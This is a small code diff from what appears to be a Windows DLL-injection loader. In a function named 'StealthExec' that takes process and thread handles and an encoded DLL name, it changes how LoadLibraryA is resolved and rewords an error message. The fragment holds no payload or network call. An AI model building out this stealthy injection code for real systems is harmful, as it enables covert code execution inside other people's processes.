@@ -15,10 +15,10 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     NTSTATUS status;
 
     // Resolve Required Functions
-    FARPROC pLLoad = ResolveFn("kernel32.dll", "LoadLibraryA");
+    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");
 
     if (!pLLoad) {
-        printf("[!] Unable to resolve core functions.\n");
+        printf("[!] Failed to resolve LoadLibraryA.\n");
         return;
     }
 
